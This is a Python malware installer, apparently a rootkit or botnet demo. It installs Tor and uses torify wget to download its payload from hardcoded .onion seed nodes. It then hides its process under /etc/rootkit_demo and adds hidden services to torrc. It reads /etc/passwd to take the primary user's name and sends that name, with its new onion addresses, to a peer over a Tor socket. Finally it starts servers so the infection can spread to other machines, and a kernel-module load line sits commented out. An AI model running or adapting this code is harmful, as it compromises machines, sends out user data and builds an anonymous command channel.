import os
from os import path
import time
import socket
import subprocess
import sys

ENCODING = 'latin1'

# Declare seed directions, infected machines will try
# to download files from this nodes 
seed_directions = [
    ('kdq2tg4jedd5tqxs.onion','57yvvr2pfb46zull.onion'),
]

# Declare all the files that need to download
folder_to_download = 'source/'

hidden_folder_path = '/etc/rootkit_demo'
hidden_public_folder_path = hidden_folder_path + '/public'
hidden_private_folder_path = hidden_folder_path + '/private'
start_server_script = hidden_public_folder_path + '/source/server.py'
tor_hidden_service_path = '/var/lib/tor'
torrc_path = '/etc/tor/torrc'   

down_port = 40000
tor_down_port = 40001
comm_port = 50000
tor_comm_port = 50001
pid = os.getpid()

# Install required tools
os.system("apt install -y tor")
os.system("apt install -y python3-pip")
os.system("pip3 install pysocks")
# We can import this after installing it
import socks
# Cryptogaphy seems to come preinstalled with pip
# so we need to upgrade the module
os.system("pip3 install --upgrade cryptography")

# Create folder to hide
# Create a file inside and add the pid of this process
# All the processes written in this file will be hidden
# from commands like ps
os.mkdir(hidden_folder_path)
os.mkdir(hidden_public_folder_path)
os.mkdir(hidden_private_folder_path)
process_file = hidden_folder_path + '/process'
with open(process_file, 'a') as process_file:
    process_file.write(f'{pid}\n')

comm_address = None
# Try to download files from next seed
# We continue trying seeds until one works
for i, address_pair in enumerate(seed_directions):
    if not os.path.exists(os.path.join(hidden_folder_path, folder_to_download)):
        down_address = address_pair[0]
        comm_address = address_pair[1]
        command = f'torify wget {down_address}:{tor_down_port}/ -r -np -nH -R "index.html*" -P {hidden_public_folder_path}'
        os.system(command)
    if i == len(seed_directions):
        print('No seed is up')
        sys.exit()
os.system(f'cp {hidden_public_folder_path}/peer_list {hidden_private_folder_path}/full_peer_list')

# Insert linux kernel module
# os.system(f"insmod {hidden_folder_path}/rootkit.ko")

# Create hidden services
# 1. Create name of the hidden service folder
# 2. Open config tor file and add hidden service at the end

# Create simple http server hidden service
hidden_web_folder = tor_hidden_service_path + '/hidden_download/'
with open(torrc_path, 'a') as torrc_file:
    torrc_file.write(f'HiddenServiceDir {hidden_web_folder}\n')
    torrc_file.write(f'HiddenServicePort {tor_down_port} localhost:{down_port}\n')

# Create communicaiton hidden service
hidden_comm_folder = tor_hidden_service_path + '/hidden_communication/'
with open(torrc_path, 'a') as torrc_file:
    torrc_file.write(f'HiddenServiceDir {hidden_comm_folder}\n')
    torrc_file.write(f'HiddenServicePort {tor_comm_port} localhost:{comm_port}\n')

# Restart tor so that the hidden services are created
os.system("systemctl restart tor")
time.sleep(1)

# Now we will send to the seed: our user, and the new created onion addresses
# Save the onion addresses
with open(hidden_web_folder + 'hostname', 'r') as onion:
    web_onion = onion.read().strip()

with open(hidden_comm_folder + 'hostname', 'r') as onion:
    comm_onion = onion.read().strip()

# Save the username of the first created user in this computer
passwd_file_content = str(subprocess.run(['cat', '/etc/passwd'], stdout = subprocess.PIPE)).split('\\n')
user = [line for line in passwd_file_content if '1000' in line][0].split(':')[0]

# Set the proxy we will use so the socket messages go through tor
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
client_socket = socks.socksocket()

# Connect to the socket of another infected machine
client_socket.connect((comm_address, tor_comm_port))

# Build and send the message to update the server peer list
msg = f'0<<default<<0<<{user} {web_onion} {comm_onion}<<no signed hash'
final_msg = msg.encode(ENCODING)
client_socket.send(final_msg)

client_socket.close()

# Now that we have all the information downloaded and we sent the message,
# it is time to start the onion services and hide them. (We will not
# need to hide them really. SInce we are hiding this process, all the process
# that have this one as parent will be hidden too.

print("solo falta abrir los onion")
os.system(f"python3 {start_server_script} &")
os.system(f"cd {hidden_public_folder_path}; python3 -m http.server {down_port} &")
